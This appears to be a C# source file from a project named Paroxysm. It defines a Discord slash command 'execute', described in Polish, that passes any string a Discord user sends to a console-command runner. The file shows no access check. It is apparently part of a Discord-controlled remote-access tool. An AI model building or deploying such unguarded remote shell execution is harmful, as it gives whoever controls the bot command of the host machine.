using Discord;
using Discord.WebSocket;
using Paroxysm.Discord.Commands.Models;
using Paroxysm.Hooks.Actions;

namespace Paroxysm.Discord.Commands;

public class ExecuteCmd : ISlashCommand
{
    public SlashCommandOptions Options()
    {
        return new SlashCommandOptions
        {
            Name = "execute",
            Description = "Używa komendy w konsoli",
            Params = new SlashCommandOptionParams
            {
                Name = "command",
                Description = "Komenda do wykonania z terminalu",
                Type = ApplicationCommandOptionType.String,
                IsRequired = true
            }
        };
    }

    public Embed Execute(SocketSlashCommandData? parameters)
    {
        var executeCommand = parameters?.Options.ElementAt(0).Value;
        if (executeCommand is null)
        {
            return DiscordEmbed.CreateWithText(Color.Red, "Command executed with errors",
                "Unknown option parameters.", Environment.UserName, null);
        }

        return ExecuteCommandAction.Follow(executeCommand as string);
    }
}